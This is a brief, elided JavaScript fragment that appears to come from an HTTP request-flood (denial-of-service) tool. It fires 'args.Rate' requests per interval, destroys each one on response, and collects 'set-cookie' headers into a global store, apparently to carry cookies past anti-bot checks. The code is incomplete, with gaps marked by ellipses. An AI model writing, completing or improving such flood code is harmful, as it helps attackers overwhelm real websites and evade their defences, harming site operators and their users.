...
const cookieStore = {};  // Global store for simplicity; or make it per-client if needed
        ...
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    request.on("response", (responseHeaders) => {  // Add responseHeaders param
                        if (responseHeaders['set-cookie']) {
                            parseSetCookie(Array.isArray(responseHeaders['set-cookie']) ? responseHeaders['set-cookie'] : [responseHeaders['set-cookie']]);
                        }
                        request.close();
                        request.destroy();
                        return
